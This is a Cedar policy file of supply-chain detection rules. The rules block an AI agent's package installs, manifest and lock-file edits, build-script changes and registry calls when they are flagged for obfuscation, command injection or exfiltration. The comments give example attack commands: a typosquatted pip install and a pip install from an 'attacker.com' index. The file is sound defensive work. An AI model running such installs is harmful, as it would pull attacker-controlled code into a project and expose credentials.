// ═══════════════════════════════════════════════════════
// Sondera – Supply Chain Risk Detection Policies
// ═══════════════════════════════════════════════════════
//
// Detects and prevents supply chain attacks through package
// management systems, dependency file tampering, and build
// script injection. Covers Python (pip), Node.js (npm),
// Rust (cargo), Ruby (gem), and system package managers.
//
// Namespace: Jans:: (aligned with jans-cedarling / carapace)
//
// Attack Patterns Detected:
//   1. Typosquatting: obfuscated package names in install commands
//   2. Command injection: shell operators in dependency manifests
//   3. Build script attacks: malicious setup.py, build.rs, webpack.config.js
//   4. Dependency confusion: custom registries with exfiltration
//   5. Lock file tampering: modifications to package-lock.json, Cargo.lock, etc.
//   6. Transitive attacks: injection in dependency configurations
//   7. Secrets in manifests: credentials in package.json, requirements.txt
//   8. Registry manipulation: suspicious fetches to package registries
//
// MITRE ATT&CK Mappings:
//   T1195.001  Supply Chain Compromise (Software Dependencies)
//   T1195.002  Compromise Software Supply Chain
//   T1552.001  Unsecured Credentials (Credentials in Files)
//   T1059.004  Command and Scripting Interpreter (Unix Shell)
//   T1027      Obfuscated Files or Information

// Block obfuscated package installation commands.
// Detects typosquatting and name confusion attacks.
// Example: pip install b4se64_encod3r
@id("forbid-suspicious-package-install-obfuscated")
forbid (
    principal,
    action == Jans::Action::"exec_command",
    resource
) when {
    (context.command like "*pip install*"     ||
     context.command like "*npm install*"     ||
     context.command like "*cargo add*"       ||
     context.command like "*gem install*"     ||
     context.command like "*apt-get install*") &&
    context.signature.categories.contains("obfuscation") &&
    context.signature.severity >= 2
};

// Block package installations with command injection patterns.
// Prevents execution of shell commands embedded in install flags.
@id("forbid-package-install-command-injection")
forbid (
    principal,
    action == Jans::Action::"exec_command",
    resource
) when {
    (context.command like "*pip install*" ||
     context.command like "*npm install*" ||
     context.command like "*cargo add*") &&
    context.signature.categories.contains("command_injection") &&
    context.signature.severity >= 3
};

// Block injection attacks in dependency files.
// Prevents command injection and obfuscation in dependency manifests.
@id("forbid-dependency-file-injection-attack")
forbid (
    principal,
    action in [Jans::Action::"write_file", Jans::Action::"edit_file"],
    resource
) when {
    (context.path like "*/requirements.txt"    ||
     context.path like "*/package.json"        ||
     context.path like "*/Cargo.toml"          ||
     context.path like "*/Pipfile"             ||
     context.path like "*/setup.py"            ||
     context.path like "*/pyproject.toml"      ||
     context.path like "*/build.rs"            ||
     context.path like "*/webpack.config.js"   ||
     context.path like "*/.gemfile") &&
    (context.signature.categories.contains("command_injection") ||
     context.signature.categories.contains("obfuscation"))
};

// Block non-compliant modifications to build scripts.
// Prevents injection of malicious code in build automation.
@id("forbid-build-script-modification-non-compliant")
forbid (
    principal,
    action in [Jans::Action::"write_file", Jans::Action::"edit_file"],
    resource
) when {
    (context.path like "*/setup.py"           ||
     context.path like "*/build.rs"           ||
     context.path like "*/webpack.config.js"  ||
     context.path like "*/Makefile"           ||
     context.path like "*/tox.ini") &&
    !context.policy.compliant
};

// Block command injection in package lock files.
// Prevents tampering with pinned dependency versions.
@id("forbid-package-lock-tampering-injection")
forbid (
    principal,
    action in [Jans::Action::"write_file", Jans::Action::"edit_file"],
    resource
) when {
    (context.path like "*/package-lock.json" ||
     context.path like "*/yarn.lock"         ||
     context.path like "*/Cargo.lock"        ||
     context.path like "*/poetry.lock") &&
    context.signature.categories.contains("command_injection")
};

// Block exfiltration attempts to package registries.
// Prevents credential stealing via package registry access.
@id("forbid-suspicious-registry-fetch-exfiltration")
forbid (
    principal,
    action == Jans::Action::"call_api",
    resource
) when {
    context.signature.categories.contains("exfiltration") &&
    (context.url like "*pypi.org*"      ||
     context.url like "*npmjs.org*"     ||
     context.url like "*crates.io*"     ||
     context.url like "*rubygems.org*"  ||
     context.url like "*npmjs.com*") &&
    context.signature.severity >= 3
};

// Block exfiltration attempts when fetching build scripts.
// Prevents malicious download and execution of remote build scripts.
@id("forbid-external-build-script-fetch")
forbid (
    principal,
    action == Jans::Action::"call_api",
    resource
) when {
    (context.prompt like "*setup.py*"     ||
     context.prompt like "*build script*" ||
     context.prompt like "*Makefile*"     ||
     context.prompt like "*configure*") &&
    context.signature.categories.contains("exfiltration")
};

// Block secrets in installation and build configuration files.
// Prevents exposure of credentials in package metadata.
@id("forbid-install-script-with-secrets")
forbid (
    principal,
    action in [Jans::Action::"write_file", Jans::Action::"edit_file"],
    resource
) when {
    (context.path like "*/install.sh"       ||
     context.path like "*/setup.sh"         ||
     context.path like "*/requirements.txt" ||
     context.path like "*/package.json") &&
    context.signature.categories.contains("secrets_detection") &&
    context.signature.severity >= 3
};

// Block dependency confusion attacks via custom registries.
// Prevents installation from attacker-controlled package sources.
// Example: pip install -i http://attacker.com/simple package-name
@id("forbid-dependency-confusion-suspicious-source")
forbid (
    principal,
    action == Jans::Action::"exec_command",
    resource
) when {
    (context.command like "*pip install*" ||
     context.command like "*npm install*") &&
    (context.command like "*--index-url*" ||
     context.command like "*-i*"          ||
     context.command like "*--registry*") &&
    context.signature.categories.contains("exfiltration")
};

// Block injection in dependency file results.
// Prevents command execution via transitive dependencies.
@id("forbid-transitive-dependency-injection")
forbid (
    principal,
    action == Jans::Action::"observe_file_result",
    resource
) when {
    (context.path like "*/setup.py"          ||
     context.path like "*/requirements.txt"  ||
     context.path like "*/package.json"      ||
     context.path like "*/Cargo.toml") &&
    context.signature.categories.contains("command_injection") &&
    context.signature.severity >= 3
};

// Block environment variable injection in setup.py.
// Prevents manipulation of build process via environment variables.
@id("forbid-setup-py-environment-variable-injection")
forbid (
    principal,
    action in [Jans::Action::"write_file", Jans::Action::"edit_file"],
    resource
) when {
    context.path like "*/setup.py" &&
    (context.signature.categories.contains("command_injection") ||
     context.signature.categories.contains("environment_variable_injection"))
};

// Block exfiltration during package publishing.
// Prevents credential/data theft when uploading packages.
@id("forbid-package-metadata-exfiltration")
forbid (
    principal,
    action == Jans::Action::"exec_command",
    resource
) when {
    (context.command like "*python setup.py*" ||
     context.command like "*npm publish*"     ||
     context.command like "*cargo publish*") &&
    context.signature.categories.contains("exfiltration")
};
